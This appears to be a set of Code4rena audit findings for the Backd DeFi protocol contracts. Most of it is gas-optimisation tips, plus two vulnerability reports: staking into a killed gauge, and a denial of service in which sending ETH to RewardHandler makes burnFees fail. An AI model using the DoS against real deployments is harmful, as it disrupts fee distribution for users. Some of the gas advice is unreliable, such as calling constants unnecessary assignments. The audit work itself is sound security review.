https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L36 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L44 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L55 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L31 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L43 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L46  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-10] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  One case of function arguments using memory instead of calldata can use this improvement to save gas https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L43  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  Related DoS issue https://twitter.com/danielvf/status/1519381832592199681  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-11] Write contracts in vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas
## More efficient Struct packing of Market in the contract ComptrollerStorage.sol           The following structs could change the order of their stored elements to decrease memory uses.         and number of occupied slots. Therefore will save gas at every store and load from memory.          In ComptrollerStorage.sol, Market is optimized to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. uint256         2. mapping         3. bool         4. bool       ## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          RoleManager.sol, 137: account == addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY, false);         BkdTriHopCvx.sol, 169: if (_lpBalance() == 0) return false;         Vault.sol, 647: if (address(strategy) == address(0)) return false;         CvxCrvRewardsLocker.sol, 283: if (IERC20(CVX_CRV).balanceOf(address(this)) == 0) return false;         Vault.sol, 434: if (address(strategy) == address(0)) return false;    ## State variables that could be set immutable  In the following files there are state variables that could be set immutable to save gas.   ### Code instances:          _decimals in LpToken.sol         minter in LpToken.sol         token in StakerVault.sol         minWithdrawalDelay in VaultReserve.sol    ## Unused state variables  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          Errors.sol, INVALID_TOKEN_TO_REMOVE         AddressProviderKeys.sol, _REWARD_HANDLER_KEY         Errors.sol, ADDRESS_NOT_ACTION         Errors.sol, INVALID_INDEX         InterestRateModel.sol, isInterestRateModel    ## Unused declared local variables  Unused local variables are gas consuming, since the initial value assignment costs gas. And are  a bad code practice. Removing those variables will decrease the gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          PoolMigrationZap.sol, migrate, ethValue_         RewardHandler.sol, burnFees, ethBalance         FeeBurner.sol, _depositInPool, ethBalance_    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instances:          StakerVault.sol, actions, 259         InflationManager.sol, stakerVaults, 116         PoolMigrationZap.sol, newPools_, 22         VestedEscrow.sol, amounts, 94         PoolMigrationZap.sol, oldPoolAddresses_, 39    ## Prefix increments are cheaper than postfix increments  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:   ### Code instance:          just change to unchecked: PoolMigrationZap.sol, i, 22    ## Unnecessary default assignment   Unnecessary default assignments, you can just declare and it will save gas and have the same meaning.       ### Code instances:          Vault.sol (L#43) : uint256 internal constant _INITIAL_STRATEGIST_FEE = 0.1e18;         Vault.sol (L#46) : uint256 public constant MAX_PERFORMANCE_FEE = 0.5e18;         Vault.sol (L#42) : uint256 internal constant _INITIAL_RESERVE_FEE = 0.01e18;         CvxCrvRewardsLocker.sol (L#43) : int128 private constant _CRV_INDEX = 0;         Vault.sol (L#44) : uint256 internal constant _INITIAL_PERFORMANCE_FEE = 0;     ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instances:  In VestedEscrow.sol,rearranging the storage fields can optimize to: 8 slots from: 9 slots. The new order of types (you choose the actual variables):         1. IERC20         2. uint256         3. uint256         4. uint256         5. uint256         6. uint256         7. address         8. bool         9. address  In KeeperGauge.sol,rearranging the storage fields can optimize to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. IController         2. uint256         3. address         4. uint48         5. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instances:          Errors.sol (L22), string internal constant INVALID_IMPLEMENTATION = "invalid pool implementation for given coin";         Errors.sol (L59), string internal constant FAILED_MINT = "mint failed";         Errors.sol (L62), string internal constant NOTHING_TO_CLAIM = "there is no claimable balance";         Errors.sol (L55), string internal constant UNDERLYING_NOT_SUPPORTED = "underlying token not supported";         Errors.sol (L91), string internal constant STRATEGY_DOES_NOT_EXIST = "Strategy does not exist";    ## Short the following require messages  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:   ### Code instance:          Solidity file: Minter.sol, In line 150, Require message length to shorten: 38, The message: Maximum non-inflation amount exceeded.    ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instances:          AmmConvexGauge.sol, 171: change 'amount > 0' to 'amount != 0'         StakerVault.sol, 323: change 'balance > 0' to 'balance != 0'         LiquidityPool.sol, 469: change 'underlyingAmount > 0' to 'underlyingAmount != 0'         InflationManager.sol, 602: change 'totalAmmTokenWeight > 0' to 'totalAmmTokenWeight != 0'         Controller.sol, 107: change 'balance > 0' to 'balance != 0'    ## Unnecessary cast        ### Code instances:          IController PoolFactory.sol.constructor - unnecessary casting IController(_controller)         IController LpGauge.sol.constructor - unnecessary casting IController(_controller)         address CompoundHandler.sol._repayAnyDebt - unnecessary casting address(ctoken)         IController LiquidityPool.sol.constructor - unnecessary casting IController(_controller)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          BkdLocker.sol (L#124) - stashedGovTokens[msg.sender].push( WithdrawStash(block.timestamp + currentUInts256[_WITHDRAW_DELAY], amount) );         Minter.sol (L#188) - totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         AmmGauge.sol (L#89) - ammStakedIntegral_ += (controller.inflationManager().getAmmRateForToken(ammToken) * (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);         BkdLocker.sol (L#276) - newBoost += (block.timestamp - lastUpdated[user]) .scaledDiv(currentUInts256[_INCREASE_PERIOD]) .scaledMul(maxBoost - startBoost);         LpGauge.sol (L#69) - poolStakedIntegral_ += (inflationManager.getLpRateForStakerVault(address(stakerVault)) * (block.timestamp - poolLastUpdate)).scaledDiv(poolTotalStaked);    ## Consider inline the following functions to save gas       You can inline the following functions instead of writing a specific function to save gas.     (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)       ### Code instances          ScaledMath.sol, scaledDiv, { return (a * DECIMAL_SCALE) / b; }         ExponentialNoError.sol, lessThanOrEqualExp, { return left.mantissa <= right.mantissa; }         Preparable.sol, _prepare, { return _prepare(key, value, _MIN_DELAY); }         AddressProviderHelpers.sol, getSafeRewardHandler, { return provider.getAddress(AddressProviderKeys._REWARD_HANDLER_KEY, false); }         TopUpKeeperHelper.sol, _positionToTopup, { return TopupData(user, position.account, position.protocol, position.record); }    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          ExponentialNoError.sol, sub_         BkdTriHopCvx.sol, _minLpAccepted         FeeBurner.sol, _swapperRouter         LiquidityPool.sol, _doTransferIn         CompoundHandler.sol, _getAccountBorrowsAndSupply    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  DecimalScale.sol, 22 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(_DECIMALS - decimals);  DecimalScale.sol, 12 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(_DECIMALS - decimals);  DecimalScale.sol, 20 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(decimals - _DECIMALS);  DecimalScale.sol, 10 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(decimals - _DECIMALS);     ## Change if -> revert pattern to require  Change if -> revert pattern to 'require' to save gas and improve code quality, if (some_condition) {          revert(revert_message)  }  to: require(!some_condition, revert_message)  In the following locations:  ### Code instance:          CTokenRegistry.sol, 62    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L63  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103   # Vulnerability details  ## Impact Staking is not stopped even when Gauge is killed. User will not be getting any reward for the staked asset.  ## Proof of Concept 1. Assume the AMMGauge is killed using kill function (AmmGauge.sol#L49). This sets killed as true  2. poolCheckpoint will not further increase ammStakedIntegral and would simply return false  ``` function poolCheckpoint() public virtual override returns (bool) {         if (killed) {             return false;         }   ...   } ```  3. User calls stakeFor function and is still able to stake amount.   4. The drawback will be no rewards as poolCheckpoint will only return false and will not update ammStakedIntegral  ## Recommended Mitigation Steps Add below check in stakeFor function, restricting deposit if Gauge is killed  ``` require(!killed, "Gauge killed"); ```  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L50   # Vulnerability details  ## Impact burnFees will fail if none of the pool tokens have underlying token as native ETH token. This is shown below. Since burnFees fails so no fees is deposited in BKDLocker  ## Proof of Concept 1. Assume RewardHandler.sol has currently amount 5 as address(this).balance (ethBalance) (even attacker can send a small balance to this contract to do this dos attack) 2. None of the pools have underlying as address(0) so no ETH tokens and only ERC20 tokens are present 3. Now feeBurner.burnToTarget is called passing current ETH balance of amount 5 with all pool tokens 4. feeBurner loops through all tokens and swap them to WETH. Since none of the token is ETH so burningEth_ variable is false 5. Now the below require condition fails since burningEth_ is false   ``` require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); ```  6. This fails the burnFees function.  ## Recommended Mitigation Steps ETH should not be sent if none of pool underlying token is ETH. Change it to something like below:  ``` bool ethFound=false; for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             } else { ethFound=true; }             tokens[i] = underlying;         }  if(ethFound){         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken); } else { feeBurner.burnToTarget(tokens, targetLpToken); } ```  
## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L143 Function _setConfig: No need to set deadlines[key] = 0; as this was already done in _executeDeadline function  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L218 Function _mint: Check that amount is not equal to zero  ``` amount!=0 ```  Note: do same for mintNonInflationTokens  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L59 Function claimRewards: Since amount is uint type so amount cannot be <0. Change it to    ``` if (amount == 0) return 0;  ```  Note: Same need to be fixed for other Gauge like AMMGauge  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L214 Function claimFees: If claimable is zero, no need to go further  ``` require(claimable!=0); ```
## cache in variables instead of loading  ### description   The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas).   ### findings  array lengths should be cached  ``` /2022-05-backd/protocol/contracts/access/RoleManager.sol 82: for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/RewardHandler.sol 42: for (uint256 i; i < pools.length; i = i.uncheckedInc()) { 259: for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 56: for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/InflationManager.sol 116: for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 94: for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ```  ## use calldata instead of memory  ### description  Use calldata instead of memory for function parameters saves gas if the function argument is only read.  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 43: function burnToTarget(address[] memory tokens_, address targetLpToken_) ```  ## named returns and a return statement isn’t necessary  ### description Removing unused named returns variables can reduce gas usage (MSTOREs/MLOADs) and improve code clarity. To save gas and improve code quality: consider using only one of those.  ### findings   ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 47: returns (uint256 received) ```  ## using prefix increments save gas  ### description Prefix increments are cheaper than postfix increments, eg ++i rather than i++  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/KeeperGauge.sol 98: epoch++; ```  ## use custom errors  ### description  use custom errors instead of revert strings  If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.  ### findings  eg ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 82: require(!initializedSupply, "Supply already initialized once"); ```  
